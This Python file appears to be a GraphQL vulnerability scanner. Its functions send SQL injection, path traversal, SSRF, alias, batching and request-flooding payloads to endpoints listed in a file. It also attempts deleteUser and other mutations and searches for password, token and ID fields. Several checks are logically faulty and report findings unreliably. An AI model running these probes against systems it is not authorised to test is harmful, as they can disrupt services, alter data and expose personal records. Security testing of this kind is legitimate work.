import requests
import json

# Define the GraphQL endpoint URL
def load_endpoints(filename):
    with open(filename, "r") as file:
        for line in file:
            yield json.loads(line)['url']


def print_red(text):
    print("\033[91m{}\033[0m".format(text))

def print_green(text):
    print("\033[92m{}\033[0m".format(text))

def get_headers(auth_token=None):
    """ Returns HTTP headers suitable for making requests. """
    headers = {'Content-Type': 'application/json'}
    if auth_token:
        headers['Authorization'] = f'Bearer {auth_token}'
    return headers

def check_resource_request(url, auth_token=None):
    """Checks for excessive resource request vulnerability."""
    resource_query = {
        'query': '''{
            __type(name: "User") {
                name
                fields {
                    name
                    type {
                        name
                        kind
                        ofType {
                            name
                            kind
                        }
                    }
                }
            }
        }'''}
    try:
        response = requests.post(url, json=resource_query, headers=get_headers(auth_token))
        response.raise_for_status()
        response_json = response.json()
        if 'data' in response_json and '__type' in response_json['data']:
            return "Excessive resource request vulnerability found."
        else:
            return "Excessive resource request vulnerability not found."
    except Exception as e:
        return "Error during resource request check."
    
def test_dos_attack(url, auth_token=None):
    """Tests for Denial of Service vulnerability using repeated query submission."""
    query = "query { systemUpdate }" * 100 
    try:
        status_codes = []
        for i in range(100):
            response = requests.post(url, json={"query": query}, headers=get_headers(auth_token))
            status_codes.append(response.status_code)
        if 200 not in status_codes:
            return "DoS attack vulnerability found."
        else:
            return "DoS attack vulnerability not found."
    except Exception as e:
        return "DoS attack test failed."

def test_alias_attack(url, auth_token=None):
    """Tests for vulnerability to alias-based attacks."""
    query_list = [f"q{i}: systemUpdate" for i in range(100)]
    query = "\n".join(query_list)
    try:
        status_codes = []
        for i in range(100):
            response = requests.post(url, json={"query": query}, headers=get_headers(auth_token))
            status_codes.append(response.status_code)
        if 200 not in status_codes:
            return "Alias-based attack vulnerability found."
        else:
            return "Alias-based attack vulnerability not found."
    except Exception as e:
        return "Alias-based attack test failed."

def test_sensitive_data(url, auth_token=None):
    sensitive_fields = ['email', 'password', 'creditCardNumber']
    print("Running sensitive data test...")
    for field in sensitive_fields:
        sensitive_query = {
            'query': f'''
            {{
                search(query: "{field}") {{
                    id
                    {field}
                }}
            }}
            '''
        }
        try:
            response = requests.post(url, json=sensitive_query, headers=get_headers(auth_token))
            response.raise_for_status()
            response_json = response.json()
            if 'data' in response_json and 'search' in response_json['data']:
                return "Sensitive data leak vulnerability found."
            else:
                return "Sensitive data leak vulnerability not found."
        except Exception as e:
            return "Error during sensitive data test: " + str(e)

def test_deep_recursion_attack(url, auth_token=None):
    deep_query = 'query { user { friends { friends { friends { id } } } } }'
    try:
        response = requests.post(url, json={"query": deep_query}, headers=get_headers(auth_token))
        if response.status_code == 200:
            return "Deep recursion query handling vulnerability found."
        else:
            return "Deep recursion query handling vulnerability not found."
    except Exception as e:
        return "Deep recursion test failed: " + str(e)

def test_ssrf_vulnerability(url, auth_token=None):
    ssrf_query = """
    mutation {
        importPaste(host:"localhost", port:8080, path:"/", scheme:"http") {
            result
        }
    }
    """
    try:
        response = requests.post(url, json={'query': ssrf_query}, headers=get_headers(auth_token))
        if response.status_code == 200:
            return "SSRF attack vulnerability found."
        else:
            return "SSRF attack vulnerability not found."
    except Exception as e:
        return "Failed to send SSRF test request: " + str(e)

def test_sql_injection(url, auth_token=None):
    sql_injection_query = """
    query {
        pastes(filter:"aaa ' or 1=1--") {
            content
            title
        }
    }
    """
    try:
        response = requests.post(url, json={'query': sql_injection_query}, headers=get_headers(auth_token))
        if response.status_code == 200 and 'data' in response.json():
            return "SQL injection vulnerability found."
        else:
            return "SQL injection vulnerability not found."
    except Exception as e:
        return "Failed to send SQL injection test request: " + str(e)

def test_path_traversal(url, auth_token=None):
    path_traversal_query = """
    mutation {
        uploadPaste(filename:"../../../../../tmp/file.txt", content:"hi"){
            result
        }
    }
    """
    try:
        response = requests.post(url, json={'query': path_traversal_query}, headers=get_headers(auth_token))
        if response.status_code == 200 and 'data' in response.json() and response.json()['data']['uploadPaste']['result']:
            return "Path traversal attack vulnerability found."
        else:
            return "Path traversal attack vulnerability not found."
    except Exception as e:
        return "Path traversal test not applicable."

def test_permissions(url, auth_token=None):
    sensitive_query = """
    mutation {
        deleteUser(userId: "12345") {
            result
        }
    }
    """
    try:
        response = requests.post(url, json={'query': sensitive_query}, headers=get_headers(auth_token))
        if response.status_code in [403, 401]:
            return "Proper authorization checks vulnerability not found."
        else:
            return "Proper authorization checks vulnerability found."
    except Exception as e:
        return "Permissions test failed: " + str(e)

def test_introspection(url, auth_token=None):
    introspection_query = {
        "query": """
        query IntrospectionQuery {
            __schema {
                queryType { name }
                mutationType { name }
                subscriptionType { name }
                types {
                    name
                }
                directives {
                    name
                }
            }
        }
        """
    }
    try:
        response = requests.post(url, json=introspection_query, headers=get_headers(auth_token))
        response.raise_for_status() 
        data = response.json()
        if data.get('data', {}).get('__schema'):
            return "Introspection test vulnerability found."
        else:
            return "Introspection test vulnerability not found."
    except requests.exceptions.HTTPError:
        return "HTTP error occurred."
    except requests.exceptions.RequestException as e:
        return f"An error occurred during the request: {str(e)}"
    except ValueError:
        return "Failed to decode JSON from response."

    
    
def test_getUsers(url, auth_token=None):
    getUsers_query = {
        'query': '''
        query getUsers{
          users(where:{role:ADMINISTRATOR}){
            edges{
              node{
                userId
                name
              }
            }
          }
        }
        '''
    }
    try:
        response = requests.post(url, json=getUsers_query, headers=get_headers(auth_token))
        response.raise_for_status()
        response_json = response.json()

        if 'data' in response_json and 'users' in response_json['data']:
            return "Get users vulnerability found."
        else:
            return "Get users vulnerability not found."
    except Exception as e:
        return f"Get users test not applicable."

def test_denialOfService(url, auth_token=None):
    FORCE_MULTIPLIER = 10000
    CHAINED_REQUESTS = 1000
    queries = [{'query': 'query { posts { nodes { content comments { nodes { content } } } } }'} * FORCE_MULTIPLIER]
    
    try:
        responses = [requests.post(url, json=query, headers=get_headers(auth_token)) for query in queries]
        if all(response.status_code == 200 for response in responses):
            return "Denial of Service vulnerability not found. The server is still responsive."
        else:
            return "Denial of Service vulnerability found. The server may have crashed or become unresponsive."
    except requests.exceptions.RequestException as e:
        return f"Error occurred while making the request: {str(e)}"

def test_unauthorized_comment(url, auth_token=None):
    comment_query = {
        "query": """
            mutation {
                createComment(input: {
                    postId: 1,
                    userId: 1,
                    content: "This is a test comment.",
                    clientMutationId: "UWHATM8",
                }) {
                    clientMutationId
                }
            }
        """
    }
    try:
        response = requests.post(url, json=comment_query, headers=get_headers(auth_token))
        if response.status_code == 200 and 'UWHATM8' in response.text:
            return "Unauthorized comment vulnerability found."
        else:
            return "Unauthorized comment vulnerability not found."
    except Exception as e:
        return f"An error occurred while testing unauthorized comment: {str(e)}"

def test_batching_attack(url, auth_token=None):
    batch_queries = [{'query': '{ users { id, posts { id, title, comments { id, content } } } }'} for _ in range(50)]
    try:
        response = requests.post(url, json=batch_queries, headers=get_headers(auth_token))
        if response.status_code == 200:
            return "Batching attack vulnerability found."
        else:
            return "Batching attack vulnerability not found."
    except Exception as e:
        return f"Batching attack test failed: {str(e)}"

def test_field_limiting(url, auth_token=None):
    excessive_fields_query = 'query { user { ' + ' '.join(f'field{i}' for i in range(1000)) + ' } }'
    try:
        response = requests.post(url, json={"query": excessive_fields_query}, headers=get_headers(auth_token))
        if response.status_code == 400 and 'too many fields' in response.text.lower():
            return "Field limiting vulnerability not found."
        else:
            return "Field limiting vulnerability found."
    except Exception as e:
        return f"Field limiting test not applicable."

def test_unauthorized_mutation(url, auth_token=None):
    mutation_query = 'mutation { updatePost(id: "1", data: { title: "New Title" }) { title } }'
    try:
        response = requests.post(url, json={"query": mutation_query}, headers=get_headers(auth_token))
        if response.status_code in [200, 201] and 'title' in response.json().get('data', {}):
            return "Unauthorized mutation vulnerability found."
        else:
            return "Unauthorized mutation vulnerability not found."
    except Exception as e:
        return f"Mutation test failed: {str(e)}"

def test_sensitive_data_dynamically(url, schema, auth_token=None):
    """ Dynamically test for sensitive data based on schema introspection. """
    sensitive_keywords = [
        'password', 'passcode', 'passwd', 'pin', 'creditcard', 'ccnumber', 'cardnum', 'ssn', 'socialsecuritynumber',
        'secret', 'token', 'apikey', 'api_key', 'accesstoken', 'access_token', 'auth', 'authentication', 'credentials',
        'privatekey', 'private_key', 'secretkey', 'secret_key', 'encryptionkey', 'encryption_key',
        'bank', 'accountnumber', 'account_num', 'routingnumber', 'routing_num', 'financial',
        'salary', 'birthdate', 'birthplace', 'passportnumber', 'passport_num', 'driverlicense', 'driver_license_num',
        'address', 'email', 'phone', 'phonenumber', 'mobile', 'cell', 'contact', 'zip', 'postal', 'postcode',
        'signature', 'profile', 'ssn', 'dni', 'nationalid', 'national_id', 'taxid', 'tax_id', 'health', 'insurance',
        'beneficiary', 'beneficiary_id', 'custodian', 'guardian', 'sessionid', 'session_id', 'cookie', 'authentication_token'
    ]

    sensitive_fields = []
    findings = []

    # Identify potentially sensitive fields from the schema
    for type_info in schema:
        if type_info.get('fields'):
            for field in type_info['fields']:
                if any(keyword in field['name'].lower() for keyword in sensitive_keywords):
                    sensitive_fields.append((type_info['name'], field['name']))

    # Test each sensitive field found
    for type_name, field_name in sensitive_fields:
        query = f'{{ {type_name} {{ {field_name} }} }}'
        response = requests.post(url, json={'query': query}, headers=get_headers(auth_token))
        if response.status_code == 200 and response.json().get('data', {}).get(type_name):
            findings.append(f"Sensitive data leak detected in field: {field_name} of type {type_name}")
        else:
            findings.append(f"No sensitive data leak detected in field: {field_name} of type {type_name}")

    return findings

def test_dynamic_nested_query(url, schema, auth_token=None):
    """Dynamically tests for handling of deeply nested queries."""
    findings = []
    for type_info in schema:
        if type_info.get('fields'):
            query_fields = []
            for field in type_info['fields']:
                if field['type']['kind'] == 'OBJECT':
                    nested_fields = ' '.join([nested_field['name'] for nested_field in field['type'].get('fields', []) if nested_field['type']['kind'] != 'OBJECT'])
                    if nested_fields:
                        query_fields.append(f"{field['name']} {{ {nested_fields} }}")
            if query_fields:
                full_query = f'{{ {type_info["name"]} {{ ' + ' '.join(query_fields) + ' }} }}'
                response = requests.post(url, json={'query': full_query}, headers=get_headers(auth_token))
                if response.status_code != 200:
                    findings.append(f"Potential issue with deep nesting in {type_info['name']}")
                else:
                    findings.append(f"Nested queries handled well for {type_info['name']}")

    return findings

def test_dynamic_field_accessibility(url, schema, auth_token=None):
    """Tests for unauthorized access to potentially restricted fields."""
    restricted_keywords = ['admin', 'restricted', 'private', 'confidential']
    findings = []

    for type_info in schema:
        if type_info.get('fields'):
            for field in type_info['fields']:
                if any(keyword in field['name'].lower() for keyword in restricted_keywords):
                    query = f'{{ {type_info["name"]} {{ {field["name"]} }} }}'
                    response = requests.post(url, json={'query': query}, headers=get_headers(auth_token))
                    if response.status_code == 200 and response.json().get('data', {}).get(type_info['name']):
                        findings.append(f"Unauthorized access detected: {field['name']} in {type_info['name']}")
                    else:
                        findings.append(f"Access properly restricted for {field['name']} in {type_info['name']}")

    return findings

def test_dynamic_mutation(url, schema, auth_token=None):
    """Attempts mutations on all mutable fields to identify unauthorized write access vulnerabilities."""
    findings = []
    mutation_keywords = ['update', 'create', 'delete', 'add', 'remove', 'set']

    for type_info in schema:
        if type_info.get('fields'):
            for field in type_info['fields']:
                if 'mutation' in type_info['name'].lower() or any(keyword in field['name'].lower() for keyword in mutation_keywords):
                    mutation_query = f'mutation {{ {field["name"]}(input: {{}}) {{ id }} }}'
                    response = requests.post(url, json={'query': mutation_query}, headers=get_headers(auth_token))
                    if response.status_code == 200:
                        findings.append(f"Mutation may be possible on {field['name']} in {type_info['name']}")
                    else:
                        findings.append(f"Mutation restricted on {field['name']} in {type_info['name']}")

    return findings

def test_dynamic_subscription(url, schema, auth_token=None):
    """Tests GraphQL subscriptions for unauthorized access or data leakage issues."""
    findings = []
    for type_info in schema:
        if 'subscription' in type_info['name'].lower():
            for field in type_info['fields']:
                subscription_query = f'subscription {{ {field["name"]} {{ id }} }}'
                response = requests.post(url, json={'query': subscription_query}, headers=get_headers(auth_token))
                if response.status_code == 200:
                    findings.append(f"Subscription potentially leaking data on {field['name']}")
                else:
                    findings.append(f"Subscription access restricted for {field['name']}")

    return findings

def fetch_schema(url, auth_token=None):
    """ Fetch the GraphQL schema via introspection. """
    introspection_query = {
        "query": """
        query IntrospectionQuery {
            __schema {
                queryType { name }
                mutationType { name }
                subscriptionType { name }
                types {
                    name
                    fields {
                        name
                        type {
                            name
                            kind
                            ofType {
                                name
                                kind
                            }
                        }
                    }
                }
                directives {
                    name
                }
            }
        }
        """
    }
    try:
        response = requests.post(url, json=introspection_query, headers=get_headers(auth_token))
        response.raise_for_status()
        return response.json()['data']['__schema']['types']
    except Exception as e:
        print_red(f"Failed to fetch schema: {e}")
        return []
    
